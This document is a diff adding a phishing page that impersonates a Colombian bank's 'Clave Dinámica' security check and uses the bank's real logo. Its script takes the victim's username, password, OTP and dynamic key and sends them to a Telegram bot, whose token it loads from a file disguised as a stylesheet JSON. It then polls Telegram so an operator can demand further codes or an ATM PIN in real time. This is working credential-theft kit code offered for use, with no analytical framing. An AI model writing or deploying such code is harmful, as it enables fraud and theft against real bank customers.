@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Portal Personas - Clave Dinámica</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+
+    .loaderp {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #FFF;
+      border-bottom-color: #e8114b;
+      border-radius: 50%;
+      display: inline-block;
+      box-sizing: border-box;
+      animation: rotation 1s linear infinite;
+    }
+    @keyframes rotation {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loaderp-full {
+      position: fixed;
+      top: 0;
+      left: 0;
+      overflow-y: hidden;
+      z-index: 1000;
+      background-color: rgba(255,255,255,0.95);
+      width: 100vw;
+      height: 100vh;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .hidden { display: none !important; }
+
+    .otp-input {
+      width: 50px;
+      height: 60px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      border: 2px solid #e5e7eb;
+      border-radius: 8px;
+      margin: 0 8px;
+      transition: all 0.3s ease;
+    }
+
+    .otp-input:focus {
+      outline: none;
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+
+    .otp-input.filled {
+      border-color: #10b981;
+      background-color: #f0fdf4;
+    }
+  </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+  <div class="max-w-md mx-auto bg-white min-h-screen">
+    <div class="px-6 py-8">
+      <div class="mb-8">
+        <div class="w-48 h-12 flex items-center">
+          <img src="https://bancapersonas.bancocajasocial.com/auth/resources/0flbi/login/bcs/img/logoBCSLine.svg"
+               alt="Logo"
+               class="h-full w-auto object-contain">
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <button id="backButton" class="flex items-center text-gray-600 hover:text-gray-800 transition-colors">
+          <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+          </svg>
+          Volver
+        </button>
+      </div>
+
+      <div class="text-center mb-8">
+        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+          <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+          </svg>
+        </div>
+
+        <h2 class="text-2xl font-bold text-gray-800 mb-2">Verificación de seguridad</h2>
+        <p class="text-gray-600 mb-2">Por favor, digita tu clave dinámica de 6 dígitos</p>
+        <p class="text-sm text-gray-500" id="phoneInfo">Termina en: •••• ••••</p>
+      </div>
+
+      <div class="mb-8">
+        <label class="block text-gray-700 text-lg font-medium mb-6 text-center">Ingresa la clave dinámica</label>
+        <div class="flex justify-center mb-4" id="otpContainer">
+          <input type="password" class="otp-input" maxlength="1" id="otp1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="otp-input" maxlength="1" id="otp2" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="otp-input" maxlength="1" id="otp3" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="otp-input" maxlength="1" id="otp4" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="otp-input" maxlength="1" id="otp5" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="otp-input" maxlength="1" id="otp6" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+        </div>
+      </div>
+
+      <button id="verifyButton" disabled
+        class="w-full bg-gray-300 text-gray-500 py-3 rounded-lg text-lg font-medium mb-6 cursor-not-allowed transition-all">
+        Verificar clave
+      </button>
+
+      <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
+        <div class="flex items-start">
+          <svg class="w-5 h-5 text-blue-600 mt-0.5 mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+          </svg>
+          <div>
+            <p class="text-sm text-blue-800 font-medium mb-1">Importante</p>
+            <p class="text-sm text-blue-700">Esta es una clave única para tu dispositivo. No la compartas con nadie.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="loaderp-full" id="loaderFull" role="status" aria-hidden="true">
+    <span class="loaderp" aria-hidden="true"></span>
+    <p class="text-gray-600 text-lg font-light mt-4" id="loaderText">Verificando clave...</p>
+  </div>
+
+  <script>
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const verifyButton = document.getElementById('verifyButton');
+    const backButton = document.getElementById('backButton');
+    const loader = document.getElementById('loaderFull');
+    const loaderText = document.getElementById('loaderText');
+
+    let userData = {};
+    let loginData = {};
+    let otpData = {};
+    let polling = false;
+    let pollingTimer = null;
+    let lastUpdateId = -1;
+
+    function saveOtpData() {
+      try { localStorage.setItem('otpData', JSON.stringify(otpData)); } catch (e) { console.error('Error saving otpData:', e); }
+    }
+
+    function loadPreviousData() {
+      try {
+        userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        loginData = JSON.parse(localStorage.getItem('loginData') || '{}');
+        otpData = JSON.parse(localStorage.getItem('otpData') || '{}');
+
+        if (userData && userData.telefono) {
+          const phone = String(userData.telefono);
+          const maskedPhone = phone.slice(-4);
+          document.getElementById('phoneInfo').textContent = `Termina en: •••• ${maskedPhone}`;
+        }
+      } catch (e) {
+        console.error('Error loading previous data:', e);
+        userData = {};
+        loginData = {};
+        otpData = {};
+      }
+    }
+
+    function generateTransactionId() {
+      return Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 8);
+    }
+
+    async function loadTelegramConfig() {
+      try {
+        const res = await fetch('./css/style.json', { cache: 'no-store' });
+        if (!res.ok) throw new Error('Could not load css/style.json (status ' + res.status + ')');
+        const cfg = await res.json();
+        if (!cfg.token || !cfg.chat_id) {
+          console.error('Invalid configuration file (missing token or chat_id).');
+          return null;
+        }
+        return cfg;
+      } catch (err) {
+        console.warn('loadTelegramConfig warning:', err);
+        return null;
+      }
+    }
+
+    function setupOTPInputs() {
+      otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+          const value = e.target.value;
+          if (!/^\d$/.test(value) && value !== '') {
+            e.target.value = '';
+            return;
+          }
+          if (value) {
+            e.target.classList.add('filled');
+            if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+          } else {
+            e.target.classList.remove('filled');
+          }
+          checkOTPComplete();
+        });
+
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            otpInputs[index - 1].focus();
+            otpInputs[index - 1].classList.remove('filled');
+          }
+        });
+        input.addEventListener('focus', function() { this.select(); });
+      });
+    }
+
+    function checkOTPComplete() {
+      const otp = Array.from(otpInputs).map(i => i.value).join('');
+      const isComplete = otp.length === 6;
+      verifyButton.disabled = !isComplete;
+      verifyButton.classList.toggle('bg-blue-600', isComplete);
+      verifyButton.classList.toggle('text-white', isComplete);
+      verifyButton.classList.toggle('hover:bg-blue-700', isComplete);
+      verifyButton.classList.toggle('cursor-pointer', isComplete);
+      verifyButton.classList.toggle('bg-gray-300', !isComplete);
+      verifyButton.classList.toggle('text-gray-500', !isComplete);
+      verifyButton.classList.toggle('cursor-not-allowed', !isComplete);
+    }
+
+    async function sendDynamicKeyToTelegram(dynamicKey) {
+      otpData.dynamicKey = dynamicKey;
+      saveOtpData();
+
+      const config = await loadTelegramConfig();
+      if (!config) return { sent: false };
+
+      const message = `🔐 **Clave Dinámica Enviada**\n\n*🔗 Session ID:* ${otpData.transactionId || 'N/A'}\n*👤 Usuario:* ${userData.usuario || loginData.usuario || 'N/A'}\n*🔑 Contraseña:* ${loginData.password || 'N/A'}\n*📱 Código OTP:* ${otpData.otp || 'N/A'}\n*🔑 Clave Dinámica:* ${dynamicKey}`;
+
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: "✅ Finalizar", callback_data: `finalizar:${otpData.transactionId}` }],
+          [{ text: "❌ Error Clave Dinámica", callback_data: `error_dinamica:${otpData.transactionId}` }],
+          [{ text: "📱 Pedir OTP", callback_data: `pedir_otp:${otpData.transactionId}` }],
+          [{ text: "🔑 Pedir Dinámica", callback_data: `pedir_dinamica:${otpData.transactionId}` }],
+          [{ text: "💳 Pedir Clave Cajero", callback_data: `pedir_cajero:${otpData.transactionId}` }]
+        ]
+      };
+
+      const body = { chat_id: config.chat_id, text: message, reply_markup: keyboard, parse_mode: 'Markdown' };
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+        const j = await res.json();
+        if (!j.ok) {
+          console.error('Telegram sendMessage error:', j.description);
+          return { sent: false };
+        }
+        return { sent: true };
+      } catch (err) {
+        console.error('Fetch error sendMessage:', err);
+        return { sent: false };
+      }
+    }
+    
+    // CORRECCIÓN: Lógica de sondeo más robusta
+    async function checkAdminResponse(transactionId) {
+        if (polling) return;
+        polling = true;
+        loaderText.textContent = 'Verificando...';
+
+        const config = await loadTelegramConfig();
+        if (!config) {
+            console.error('Polling stopped: Could not load Telegram config.');
+            polling = false;
+            // Oculta el loader inmediatamente si no hay configuración
+            loader.style.display = 'none';
+            // Vuelve a habilitar los inputs para que el usuario pueda intentar de nuevo
+            otpInputs.forEach(i => i.disabled = false);
+            verifyButton.disabled = false;
+            return;
+        }
+
+        async function pollUpdates() {
+            if (!polling) {
+                // Si el polling fue detenido manualmente, no continúes
+                return;
+            }
+
+            try {
+                const url = `https://api.telegram.org/bot${config.token}/getUpdates?offset=${lastUpdateId > -1 ? lastUpdateId + 1 : -1}&timeout=30`;
+                const res = await fetch(url, { cache: 'no-store' });
+                const data = await res.json();
+                
+                if (!data.ok) {
+                    console.error('Error getting updates:', data.description);
+                    pollingTimer = setTimeout(pollUpdates, 5000);
+                    return;
+                }
+
+                if (data.result && data.result.length > 0) {
+                    lastUpdateId = data.result[data.result.length - 1].update_id;
+                    const action = data.result.find(update =>
+                        update.callback_query && update.callback_query.data.endsWith(`:${transactionId}`)
+                    );
+                    
+                    if (action) {
+                        loader.style.display = 'none';
+                        handleAdminResponse(action.callback_query.data);
+                        polling = false;
+                        return;
+                    }
+                }
+                pollingTimer = setTimeout(pollUpdates, 2000);
+            } catch (err) {
+                console.error('Polling fetch error:', err);
+                pollingTimer = setTimeout(pollUpdates, 5000);
+            }
+        }
+        
+        // CORRECCIÓN: Se inicializa el sondeo después de enviar el mensaje
+        fetch(`https://api.telegram.org/bot${config.token}/getUpdates?offset=-1`, { cache: 'no-store' });
+        
+        pollUpdates();
+    }
+
+    function handleAdminResponse(callbackData) {
+      const [action, transactionId] = (callbackData || '').split(':');
+      switch (action) {
+        case 'error_dinamica':
+          alert('Clave dinámica incorrecta. Por favor, intenta de nuevo.');
+          otpInputs.forEach(input => {
+            input.value = '';
+            input.classList.remove('filled');
+          });
+          otpInputs[0].focus();
+          checkOTPComplete();
+          break;
+        case 'pedir_otp':
+          window.location.href = 'otp.html';
+          break;
+        case 'pedir_dinamica':
+          window.location.href = 'dinamica.html';
+          break;
+        case 'pedir_cajero':
+          window.location.href = 'clavec.html';
+          break;
+        case 'finalizar':
+        default:
+          alert('Verificación completada exitosamente.');
+          localStorage.clear();
+          window.location.href = 'index.html';
+          break;
+      }
+    }
+
+    verifyButton.addEventListener('click', async function() {
+      const dynamicKey = Array.from(otpInputs).map(i => i.value).join('');
+      if (dynamicKey.length !== 6) return;
+
+      loader.style.display = 'flex';
+      loaderText.textContent = 'Enviando clave...';
+      otpInputs.forEach(i => i.disabled = true);
+      verifyButton.disabled = true;
+
+      const { sent } = await sendDynamicKeyToTelegram(dynamicKey);
+
+      if (sent) {
+        checkAdminResponse(otpData.transactionId);
+      } else {
+        loader.style.display = 'none';
+        otpInputs.forEach(i => i.disabled = false);
+        verifyButton.disabled = false;
+        checkOTPComplete();
+        alert('No se pudo notificar al administrador. Intenta de nuevo.');
+      }
+    });
+
+    backButton.addEventListener('click', function() {
+      window.history.back();
+    });
+
+    document.addEventListener('DOMContentLoaded', function() {
+      loadPreviousData();
+      setupOTPInputs();
+      if (!otpData.transactionId) {
+        otpData.transactionId = generateTransactionId();
+        saveOtpData();
+      }
+      if (otpInputs && otpInputs[0]) otpInputs[0].focus();
+    });
+  </script>
+</body>
+</html>
